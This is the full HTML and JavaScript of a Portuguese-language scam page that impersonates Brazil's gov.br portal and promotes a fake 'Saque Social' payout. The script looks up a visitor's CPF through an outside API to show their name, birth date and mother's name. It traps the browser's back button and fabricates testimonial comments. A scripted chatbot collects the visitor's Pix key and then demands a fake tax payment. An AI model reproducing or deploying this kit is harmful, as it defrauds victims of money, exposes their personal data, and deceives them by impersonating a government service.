<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
  <title>Programa Saque Social - CONSULTA</title>
  <link rel="icon" href="images/favic.png" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
    async defer></script>
  <script>
    var urlBackRedirect = '../back/index.html'.trim() + ('./back/index.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '');
    history.pushState({}, "", location.href);
    history.pushState({}, "", location.href);
    window.onpopstate = function () { setTimeout(function () { location.href = urlBackRedirect; }, 1); };
  </script>
  <link rel="stylesheet" href="css/all.min.css">
  <style>
    :root {
      --gov-blue-primary: #1351B4;
      --gov-blue-secondary: #0F4DA8;
      --gov-blue-light: #E8F4FD;
      --gov-blue-dark: #0C326F;
      --gov-green: #168821;
      --gov-orange: #FF7A00;
      --gov-gray-light: #F8F9FA;
      --gov-gray-medium: #E5E5E5;
      --gov-gray-dark: #495057;
      --gov-white: #FFFFFF;
      --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
      --border-radius: 8px;
      --transition: all 0.3s ease;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; overflow-x: hidden; }
    body {
      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, var(--gov-blue-light) 0%, var(--gov-white) 100%);
      min-height: 100vh;
      color: var(--gov-gray-dark);
      line-height: 1.6;
      display: flex;
      flex-direction: column;
      font-feature-settings: 'kern' 1, 'liga' 1;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    #loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--gov-white);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    #loading-screen.hidden { display: none !important; }
    .blink-logo {
      animation: blink 1s infinite;
      width: 120px;
      height: auto;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
    header {
      background: var(--gov-white);
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: var(--gov-shadow);
      position: sticky;
      top: 0;
      z-index: 1000;
      border-bottom: 3px solid var(--gov-blue-primary);
    }
    header .logo {
      display: flex;
      align-items: center;
    }
    header .logo img {
      height: 40px;
      width: auto;
      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
    }
    header .icons {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    header .icons button {
      background: none;
      border: none;
      padding: 8px;
      cursor: pointer;
      transition: var(--transition);
      color: var(--gov-blue-primary);
    }
    header .icons button:hover {
      background: var(--gov-blue-light);
      transform: translateY(-1px);
    }
    header .icons button i {
      font-size: 16px;
    }
    header .user {
      background-color: #1451b4;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 6px 16px;
      display: flex;
      align-items: center;
      cursor: pointer;
    }

    header .user i {
      margin-right: 8px;
    }

    nav {
      background: var(--gov-white);
      padding: 12px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid var(--gov-gray-medium);
      position: sticky;
      top: 79px;
      z-index: 999;
    }
    nav button {
      background: none;
      border: none;
      display: flex;
      align-items: center;
      cursor: pointer;
      padding: 8px 12px;
      border-radius: var(--border-radius);
      transition: var(--transition);
    }
    nav button:hover {
      background: var(--gov-gray-light);
    }
    nav button i {
      font-size: 16px;
      color: var(--gov-blue-primary);
      margin-right: 8px;
    }
    nav button p {
      color: var(--gov-gray-dark);
      font-size: 14px;
      font-weight: 400;
      margin: 0;
    }
    nav button span {
      color: var(--gov-blue-primary);
      font-weight: 500;
    }
    #main-content {
      padding: 0 24px;
      max-width: 720px;
      flex: 1 0 auto;
      padding-bottom: 40px;
      margin: 0 auto;
      width: 100%;
    }
    .progress-container {
      width: 100%;
      height: 15px;
      background-color: var(--gov-gray-medium);
      border-radius: 10px;
      margin-top: 16px;
      margin-bottom: 16px;
      overflow: hidden;
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    .progress-bar {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, var(--gov-blue-primary), var(--gov-green));
      transition: width 0.2s linear;
      border-radius: 10px;
    }
    .video-container {
      position: relative;
      width: 100%;
      border-radius: var(--border-radius);
      overflow: hidden;
      box-shadow: var(--gov-shadow);
      z-index: 1;
    }
    .video-container video {
      width: 100%;
      height: auto;
      display: block;
    }
    .thumbnail-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      display: none;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 10;
      cursor: pointer;
    }
    .thumbnail-content {
      background: rgba(19, 81, 180, 0.9);
      border-radius: var(--border-radius);
      padding: 15px;
      text-align: center;
      animation: pulse 2s infinite;
      display: flex;
      flex-direction: column;
      align-items: center;
      box-shadow: var(--gov-shadow-hover);
    }
    .thumbnail-content h2 {
      font-size: 24px;
      color: var(--gov-white);
      margin-bottom: 12px;
      font-weight: 600;
    }
    .thumbnail-content i {
      font-size: 64px;
      color: var(--gov-white);
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    .resgate-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      display: none;
      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-green));
      justify-content: center;
      align-items: center;
      text-align: center;
      color: var(--gov-white);
      padding: 20px;
      z-index: 10;
    }
    .resgate-content {
      max-width: 80%;
      margin: 0 auto;
    }
    .resgate-content h2 {
      font-size: 20px;
      margin-bottom: 10px;
      font-weight: 600;
    }
    .resgate-content p {
      font-size: 16px;
      line-height: 1.4;
    }
    .info-container {
      margin-top: 16px;
      display: flex;
      flex-direction: column;
      gap: 8px;
      background: var(--gov-white);
      padding: 16px;
      border-radius: var(--border-radius);
      box-shadow: var(--gov-shadow);
    }
    .info-item {
      font-size: 14px;
      color: var(--gov-gray-dark);
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 8px 0;
    }
    .info-item i {
      color: var(--gov-blue-primary);
      width: 16px;
    }
    .button-saque {
      display: none;
      margin-top: 24px;
      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
      color: var(--gov-white);
      font-size: 16px;
      padding: 16px;
      border: none;
      border-radius: var(--border-radius);
      cursor: pointer;
      transition: var(--transition);
      width: 100%;
      text-align: center;
      font-weight: 600;
      box-shadow: var(--gov-shadow);
    }
    .button-saque:hover {
      transform: translateY(-2px);
      box-shadow: var(--gov-shadow-hover);
    }
    .fb-header-outside {
      margin-top: 15px;
      padding: 15px 0 5px 24px;
      font-size: 14px;
      font-weight: bold;
      color: var(--gov-gray-dark);
      border-top: 1px solid var(--gov-gray-medium);
      width: 100%;
      background: var(--gov-white);
      text-align: left;
    }
    .fb-comments-container {
      width: 100%;
      background: var(--gov-white);
      padding: 24px;
      box-shadow: var(--gov-shadow);
    }
    .fb-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 16px;
    }
    .fb-header .fb-comment-count {
      font-size: 14px;
      font-weight: bold;
      color: var(--gov-gray-dark);
    }
    .fb-header .fb-loading {
      font-size: 12px;
      color: var(--gov-gray-dark);
      display: flex;
      align-items: center;
    }
    .fb-header .fb-loading i {
      margin-right: 6px;
    }
    .comment-item {
      display: flex;
      align-items: flex-start;
      margin-bottom: 16px;
      width: 100%;
    }
    .comment-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 8px;
      object-fit: cover;
    }
    .comment-content {
      background: var(--gov-gray-light);
      border-radius: 12px;
      padding: 8px 12px;
      position: relative;
      flex: 1;
    }
    .comment-content::before {
      content: "";
      position: absolute;
      top: 10px;
      left: -6px;
      border-top: 6px solid transparent;
      border-right: 6px solid var(--gov-gray-light);
      border-bottom: 6px solid transparent;
    }
    .comment-name {
      font-size: 14px;
      font-weight: bold;
      color: var(--gov-blue-primary);
      margin-bottom: 4px;
    }
    .comment-text {
      font-size: 14px;
      color: var(--gov-gray-dark);
      line-height: 1.3;
    }
    .comment-actions {
      display: flex;
      margin-top: 4px;
      font-size: 12px;
      color: var(--gov-gray-dark);
    }
    .comment-actions i {
      margin-right: 4px;
    }
    .comment-likes {
      margin-right: 8px;
    }
    .comment-dislikes {
      margin-right: 8px;
    }
    .comment-replies {
      margin-left: 48px;
      margin-top: 8px;
      border-left: 2px solid var(--gov-gray-medium);
      padding-left: 8px;
    }
    footer {
      background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38);
      color: var(--gov-white);
      text-align: center;
      padding: 16px;
      font-size: 14px;
      flex-shrink: 0;
    }
    #modal-chat {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 99999;
      overflow: auto;
    }
    #modal-chat.active {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-top: 5%;
    }
    .chat-bot-container {
      background: var(--gov-white);
      width: 90%;
      max-width: 400px;
      height: 80vh;
      border-radius: var(--border-radius);
      display: flex;
      flex-direction: column;
      box-shadow: var(--gov-shadow-hover);
    }
    .chat-header {
      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
      color: var(--gov-white);
      padding: 12px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-radius: var(--border-radius) var(--border-radius) 0 0;
    }
    .chat-header-title {
      font-size: 16px;
    }
    .close-btn {
      background: none;
      border: none;
      color: var(--gov-white);
      font-size: 16px;
      cursor: pointer;
    }
    .chat-body {
      flex: 1;
      padding: 16px;
      overflow-y: auto;
      background: var(--gov-gray-light);
      display: flex;
      flex-direction: column;
    }
    .message-bot-container,
    .message-user-container {
      margin-bottom: 8px;
      display: flex;
      animation: fadeInMessage 0.3s forwards;
    }
    @keyframes fadeInMessage {
      0% { opacity: 0; transform: translateY(10px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    .message-bot-container {
      align-items: flex-start;
    }
    .message-bot {
      background: var(--gov-white);
      color: var(--gov-gray-dark);
      display: inline-block;
      padding: 8px 12px;
      border-radius: 12px;
      max-width: 80%;
      line-height: 1.4;
      font-size: 14px;
      box-shadow: var(--gov-shadow);
    }
    .message-user-container {
      justify-content: flex-end;
      align-items: flex-start;
    }
    .message-user {
      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
      color: var(--gov-white);
      display: inline-block;
      padding: 8px 12px;
      border-radius: 12px;
      max-width: 80%;
      line-height: 1.4;
      font-size: 14px;
      box-shadow: var(--gov-shadow);
    }
    .bot-avatar {
      height: 15px;
      margin-right: 8px;
    }
    .chat-footer {
      background: var(--gov-white);
      display: flex;
      border-top: 1px solid var(--gov-gray-medium);
      border-radius: 0 0 var(--border-radius) var(--border-radius);
    }
    .chat-footer input[type="text"] {
      flex: 1;
      border: none;
      padding: 12px;
      font-size: 14px;
      outline: none;
    }
    .chat-footer button {
      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
      color: var(--gov-white);
      border: none;
      padding: 0 16px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
    }
    .chat-footer button:hover {
      background: linear-gradient(135deg, var(--gov-blue-secondary), var(--gov-blue-dark));
    }
    .typing-indicator-container {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
      animation: fadeInMessage 0.3s forwards;
    }
    .typing-indicator-bubble {
      background: var(--gov-white);
      color: var(--gov-gray-dark);
      padding: 8px 12px;
      border-radius: 12px;
      max-width: 80%;
      line-height: 1.4;
      font-size: 14px;
      box-shadow: var(--gov-shadow);
      position: relative;
      min-width: 60px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .blue-circle {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: var(--gov-blue-primary);
      margin: 0 3px;
      animation: bounceDots 1s infinite alternate;
    }
    @keyframes bounceDots {
      0% { transform: translateY(0); }
      100% { transform: translateY(-5px); }
    }
    .pay-button {
      background: linear-gradient(135deg, var(--gov-green), #0d6f18);
      color: var(--gov-white);
      border: none;
      padding: 8px 16px;
      border-radius: var(--border-radius);
      cursor: pointer;
      font-size: 14px;
      margin-top: 8px;
      font-weight: 500;
    }
    .pay-button:hover {
      background: linear-gradient(135deg, #0d6f18, #0a5a14);
    }
    @media (max-width: 768px) {
      header { padding: 12px 16px; }
      header .logo img { height: 32px; }
      #main-content { padding: 0 16px; }
      .fb-comments-container { padding: 16px; }
      .chat-bot-container { width: 95%; height: 90vh; }
    }
  </style>
</head>
<body>
  <div id="loading-screen">
    <img src="./images/govbr.png" style="width: 140px; margin: 10px;">
  </div>
  <header>
    <div class="logo">
      <img src="./images/govbr.png" style="width: 90px; margin: 10px;">
    </div>
    <div class="icons">
      <button><i class="fas fa-ellipsis-v"></i></button>
      <button><i class="fas fa-cookie-bite"></i></button>
      <button><i class="fas fa-th"></i></button>
      <button class="user" id="user-button" style="background-color: #1451b4;">
        <i class="fas fa-user" style="color: #fff;"></i>
        <span id="header-user-name" style="color: #fff;">Usuário</span>
      </button>
    </div>
  </header>
  <nav>
    <button>
      <i class="fas fa-bars"></i>
      <p>Benefício <span> › </span> Indenização <span> › </span> Análise</p>
    </button>
    <button><i class="fas fa-search"></i></button>
  </nav>
  <main id="main-content" class="hidden">
    <div class="progress-container">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div class="video-container">
      <video id="player" class="js-player" playsinline="" preload="auto" muted="">
        <source src="media/Zpjynr3agafy.mp4" type="video/mp4">
      </video>
      <div class="thumbnail-overlay" id="thumbnail-overlay">
        <div class="thumbnail-content">
          <h2>Clique<br>para ouvir</h2>
          <i class="fas fa-volume-mute"></i>
        </div>
      </div>
      <div class="resgate-overlay" id="resgate-overlay">
        <div class="resgate-content">
          <h2>Seu saque já está disponível para resgate!</h2>
          <p>Clique no botão abaixo para efetuar o saque.</p>
        </div>
      </div>
    </div>
    <div class="info-container">
      <div class="info-item">
        <i class="fas fa-credit-card"></i>
        <span id="cpf-value">---</span>
      </div>
      <div class="info-item">
        <i class="fas fa-user"></i>
        <span id="name-value">---</span>
      </div>
      <div class="info-item">
        <i class="fas fa-calendar"></i>
        <span id="birth-value">---</span>
      </div>
      <div class="info-item" id="mother-item">
        <i class="fas fa-female"></i>
        <span id="mother-value">---</span>
      </div>
      <div class="info-item" id="status-item">
        <i class="fas fa-search"></i>
        <span>Sua consulta está em andamento...</span>
      </div>
    </div>
    <button class="button-saque" id="button-saque">Efetuar Saque Agora</button>
  </main>
  <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
  <div class="fb-comments-container" id="fb-comments-container">
    <div class="fb-header">
      <span class="fb-comment-count" id="fb-comment-count"></span>
      <span class="fb-loading" id="fb-loading"></span>
    </div>
  </div>
  <footer>Termos de Uso e Aviso de Privacidade
    <p style="margin-top:8px;font-size:13px;">
      <a href="termos-uso.html" style="color:var(--gov-blue-primary);text-decoration:none;margin-right:12px;">Termos de Uso</a>
      <a href="politica-privacidade.html" style="color:var(--gov-blue-primary);text-decoration:none;">Política de Privacidade</a>
    </p>
  </footer>
  <div id="modal-chat">
    <div class="chat-bot-container">
      <div class="chat-header">
        <span class="chat-header-title">Atendimento Virtual</span>
        <button class="close-btn" id="close-modal"><i class="fas fa-times"></i></button>
      </div>
      <div class="chat-body" id="chat-body"></div>
      <div class="chat-footer" id="chat-footer">
        <input type="text" id="user-input" placeholder="Digite sua chave pix...">
        <button id="send-message">Enviar</button>
      </div>
    </div>
  </div>
  <script src="js/5a8zWkhgEY7Y.js"></script>
  <script>
    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
    function maskCPF(cpf) {
      const onlyNums = cpf.replace(/\D/g, '');
      if (onlyNums.length !== 11) return cpf;
      return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    let fullName = '', firstName = '', maskedCPFValue = '', birthValue = '', motherValue = '';
    let videoStarted = false, videoCompleted = false, chaveEnviada = false, progressEnabled = false;
    let totalComments = 25738;
    let storedComments = [];
    const elements = {
      loadingScreen: document.getElementById('loading-screen'),
      mainContent: document.getElementById('main-content'),
      thumbnailOverlay: document.getElementById('thumbnail-overlay'),
      resgateOverlay: document.getElementById('resgate-overlay'),
      progressBar: document.getElementById('progress-bar'),
      buttonSaque: document.getElementById('button-saque'),
      chatBody: document.getElementById('chat-body'),
      userInput: document.getElementById('user-input'),
      sendMessageBtn: document.getElementById('send-message'),
      closeModalBtn: document.getElementById('close-modal'),
      cpfSpan: document.getElementById('cpf-value'),
      nameSpan: document.getElementById('name-value'),
      birthSpan: document.getElementById('birth-value'),
      motherItem: document.getElementById('mother-item'),
      motherSpan: document.getElementById('mother-value'),
      statusItem: document.getElementById('status-item'),
      headerUserName: document.getElementById('header-user-name'),
      fbHeaderOutside: document.getElementById('fb-header-outside'),
      fbContainer: document.getElementById('fb-comments-container'),
      fbCountSpan: document.getElementById('fb-comment-count'),
      fbLoadingSpan: document.getElementById('fb-loading'),
    };
    const player = new Plyr('#player', {
      controls: [],
      hideControls: true,
      clickToPlay: false,
      autoplay: true,
      muted: true
    });
    elements.sendMessageBtn.addEventListener('click', async () => {
      const text = elements.userInput.value.trim();
      if (!text) return;
      appendUserMessage(text);
      elements.userInput.value = '';
      if (!chaveEnviada) {
        chaveEnviada = true;
        await flowAfterPixKey();
      }
    });
    elements.thumbnailOverlay.addEventListener('click', () => {
      player.pause();
      player.currentTime = 0;
      player.muted = false;
      player.play();
      elements.thumbnailOverlay.style.display = 'none';
      progressEnabled = true;
    });
    async function botMessageWithTypingDelay(text, ms = 2500) {
      addTypingIndicator();
      await delay(ms);
      removeTypingIndicator();
      appendBotMessage(text);
    }
    function addTypingIndicator() {
      const container = document.createElement('div');
      container.classList.add('typing-indicator-container', 'message-bot-container');
      container.id = 'typing-indicator';
      container.innerHTML = `
        <img class="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot"/>
        <div class="message-bot typing-indicator-bubble">
          <div class="blue-circle"></div><div class="blue-circle"></div><div class="blue-circle"></div>
        </div>`;
      elements.chatBody.appendChild(container);
      scrollChatToBottom();
    }
    function removeTypingIndicator() {
      const el = document.getElementById('typing-indicator');
      if (el) el.remove();
    }
    function appendBotMessage(text) {
      const container = document.createElement('div');
      container.classList.add('message-bot-container');
      container.innerHTML = `
        <img class="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot"/>
        <div class="message-bot">${text}</div>`;
      elements.chatBody.appendChild(container);
      scrollChatToBottom();
    }
    function appendUserMessage(text) {
      const container = document.createElement('div');
      container.classList.add('message-user-container');
      container.innerHTML = `<div class="message-user">${text}</div>`;
      elements.chatBody.appendChild(container);
      scrollChatToBottom();
    }
    function scrollChatToBottom() {
      setTimeout(() => {
        elements.chatBody.scrollTop = elements.chatBody.scrollHeight;
      }, 100);
    }
    async function flowAfterPixKey() {
      await botMessageWithTypingDelay('Excelente! Sua <b>chave Pix</b> foi vinculada com sucesso.', 2200);
      await botMessageWithTypingDelay('Observamos que o valor do seu saque supera <b>R$ 5.000</b>, segundo as diretrizes da Receita Federal.', 2500);
      await botMessageWithTypingDelay('Para prosseguir e liberar de forma imediata, é obrigatório o recolhimento de <b>1.3%</b> sobre o valor total.', 2500);
      await botMessageWithTypingDelay('<b>Valor do saque:</b> R$ 5.250,20<br><b>Imposto devido:</b> R$ 68,25<br>Depois do pagamento, o dinheiro cai na hora.', 2500);
      await botMessageWithTypingDelay('Caso o valor do imposto não seja quitado, a Receita Federal destinará o valor do seu Saque Social para projetos e iniciativas de políticos do estado.', 2500);
      await botMessageWithTypingDelay(`<b>Para finalizar o recebimento</b>, clique no botão abaixo:<button class="pay-button" id="pay-button">Pagar Imposto Agora</button>`, 2500);
    }
    player.on('timeupdate', () => {
      if (!progressEnabled || videoCompleted) return;
      const { duration, currentTime } = player;
      if (duration > 0) {
        const percent = (currentTime / duration) * 100;
        elements.progressBar.style.width = `${percent}%`;
        if (percent >= 99.9) finalizeProgress();
      }
    });
    player.on('play', () => {
      if (!videoStarted && !videoCompleted && progressEnabled) {
        videoStarted = true;
      } else if (videoCompleted) {
        player.pause();
      }
    });
    function finalizeProgress() {
      videoCompleted = true;
      elements.resgateOverlay.style.display = 'flex';
      elements.statusItem.innerHTML = `<i class="fas fa-search"></i> Saque liberado.`;
      elements.buttonSaque.style.display = 'block';
      elements.progressBar.style.width = '100%';
    }
    function initFacebookComments() {
      elements.fbHeaderOutside.textContent = `Comentários (${totalComments})`;
      const local = localStorage.getItem('commentsData');
      if (local) {
        storedComments = JSON.parse(local);
        storedComments.forEach(comm => createComment(comm.name, comm.avatar, comm.text, comm.likes, comm.dislikes, false));
        elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
        elements.fbLoadingSpan.textContent = "Comentários atualizados.";
        scheduleComments();
      } else {
        generateInitialComments();
      }
    }
    function generateInitialComments() {
      const texts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
      texts.forEach(text => createRandomComment(text, true));
      elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
      elements.fbLoadingSpan.textContent = "Comentários atualizados.";
      scheduleComments();
      saveCommentsToLocal();
    }
    function scheduleComments() {
      const messages = [
        "Alguém conseguiu R$ 2.700 hoje?",
        "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
        "Testei hoje e entrou R$ 2.100 rapidinho!",
        "Show! Liberou R$ 4.250 e já usei tudo!",
        "Recebi R$ 5.000, só precisei pagar a taxa"
      ];
      messages.forEach((msg, i) => {
        setTimeout(() => {
          elements.fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
          createRandomComment(msg, false);
          elements.fbLoadingSpan.textContent = "Comentários atualizados.";
        }, (i + 1) * 10000);
      });
    }
    async function createRandomComment(text, initial) {
      totalComments++;
      const userData = await getRandomUser();
      createComment(userData.name.first, userData.picture.medium, text, 0, 0, initial);
      storedComments.unshift({ name: userData.name.first, avatar: userData.picture.medium, text, likes: 0, dislikes: 0 });
      if (!initial) saveCommentsToLocal();
    }
    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
      const cItem = document.createElement('div');
      cItem.classList.add('comment-item');
      cItem.innerHTML = `
        <img class="comment-avatar" src="${avatar}" alt="avatar"/>
        <div class="comment-content">
          <div class="comment-name">${name}</div>
          <div class="comment-text">${text}</div>
          <div class="comment-actions">
            <span class="comment-likes"><i class="fas fa-thumbs-up"></i> ${likes}</span>
            <span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> ${dislikes}</span>
          </div>
        </div>`;
      elements.fbContainer.insertBefore(cItem, elements.fbContainer.firstChild);
      if (!initialLoad) saveCommentsToLocal();
    }
    async function getRandomUser() {
      const res = await fetch('https://randomuser.me/api/?nat=br');
      const data = await res.json();
      return data.results[0];
    }
    function saveCommentsToLocal() {
      localStorage.setItem('commentsData', JSON.stringify(storedComments));
    }
    function formatDateBR(dateStr) {
      const dateOnly = dateStr.split(' ')[0];
      const [year, month, day] = dateOnly.split('-');
      return `${day}/${month}/${year}`;
    }
    function formatarNomeCompleto(nome) {
      if (!nome) return '';
      return nome
        .toLowerCase()
        .split(' ')
        .filter(p => p)
        .map(p => p.charAt(0).toUpperCase() + p.slice(1))
        .join(' ');
    }
    function formatarCPF1(cpf) {
      const numeros = cpf.replace(/\D/g, '');
      return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    let userData = null;
    async function fetchUserData() {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        const cpf = urlParams.get('cpf');
        if (!cpf) throw new Error('CPF não encontrado.');
        const cleanCPF = cpf.replace(/\D/g, '');
        const response = await fetch(`https://genapi.fun/api.php?cpf=${cleanCPF}`);
        const data = await response.json();
        userData = data.dadosBasicos;
        if (userData.nome) {
          nome_ok = formatarNomeCompleto(userData.nome);
          elements.nameSpan.textContent = userData.nome;
          document.getElementById('header-user-name').textContent = nome_ok.split(' ')[0];
          elements.cpfSpan.textContent = formatarCPF1(userData.cpf || cleanCPF);
          elements.birthSpan.textContent = formatDateBR(userData.nascimento) || '';
          elements.motherSpan.textContent = userData.mae || 'Não Informado';
        }
      } catch (err) {
        const params = new URLSearchParams(window.location.search);
      } finally {
        elements.loadingScreen.classList.add('hidden');
        elements.mainContent.classList.remove('hidden');
        elements.thumbnailOverlay.style.display = 'flex';
        initFacebookComments();
      }
    }
    elements.buttonSaque.addEventListener('click', () => {
      const params = new URLSearchParams(window.location.search);
      if (userData) {
        params.set('nome', formatarNomeCompleto(userData.nome));
        params.set('mae', formatarNomeCompleto(userData.mae) || 'Não Informado');
        params.set('nascimento', formatDateBR(userData.nascimento));
        params.set('cpf', formatarCPF1(userData.cpf || ''));
      }
      window.location.href = `../chat.html?${params.toString()}`;
    });
    fetchUserData();
  </script>
</body>
</html>
